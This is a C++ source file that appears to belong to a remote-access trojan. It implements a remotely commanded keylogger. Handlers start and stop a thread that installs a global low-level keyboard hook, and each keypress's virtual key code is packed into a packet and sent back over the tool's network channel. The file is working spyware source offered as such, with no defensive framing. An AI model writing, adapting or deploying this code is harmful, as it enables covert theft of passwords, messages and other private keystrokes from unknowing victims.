#include			"RxKeyLog.h"

HANDLE				keyLogThread = NULL;

void				AnsAskAkl()
{
	RxPacket*		np;
	
	np = new RxPacket();
	memset(np, 0, sizeof(*np));
	if (keyLogThread == NULL && RxStartKeyLog() == true)
	{
		np->type = T_ANS_KEYLOG_OK;
		AddToSendList(np);
		return ;
	}
	np->type = T_ANS_KEYLOG_FAILED;
	AddToSendList(np);
}

void				AnsAskOkl()
{
	RxPacket*		np;
	
	np = new RxPacket();
	memset(np, 0, sizeof(*np));
	if (keyLogThread != NULL && CloseHandle(keyLogThread) == true)
	{
		keyLogThread = NULL;
		np->type = T_ANS_KEYLOG_STOP_OK;
		AddToSendList(np);
		return ;
	}
	np->type = T_ANS_KEYLOG_STOP_FAIL;
	AddToSendList(np);
}

bool				RxStartKeyLog()
{
	keyLogThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RxKeyLog, (LPVOID)NULL, 0, NULL);
	if (keyLogThread)
		return (true);
	return (false);
}

__declspec(dllexport)LRESULT CALLBACK RxKeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
		{
			BYTE				keyState[256];
			KBDLLHOOKSTRUCT		hooked = *((KBDLLHOOKSTRUCT*)lParam);
			RxPacket*			np;
			RxKeyPressed		kp;

			if (keyLogThread == NULL)
			{
				UnhookWindowsHookEx(hKeyHook);
				return 0;
			}
			GetKeyboardState(keyState);
			np = new RxPacket();
			memset(np, 0, sizeof(*np));
			np->type = T_ANS_KEY_PRESSED;
			kp.vkcode = hooked.vkCode;
			memcpy(np->data, (char*)&kp, sizeof(kp));
			AddToSendList(np);
			SendingLoop();
		}
	return (CallNextHookEx(hKeyHook, nCode, wParam, lParam));
}

DWORD	WINAPI		RxKeyLog()
{
	HINSTANCE		instance;

	instance = GetModuleHandle(NULL);
	if (!instance)
	{
		return (-1);
	}
	hKeyHook = NULL;
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)RxKeyEvent, instance, 0);
	RxMsgLoop();
}

void RxMsgLoop()
{
    MSG	message;

    while ((GetMessage(&message, NULL, 0, 0)))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}
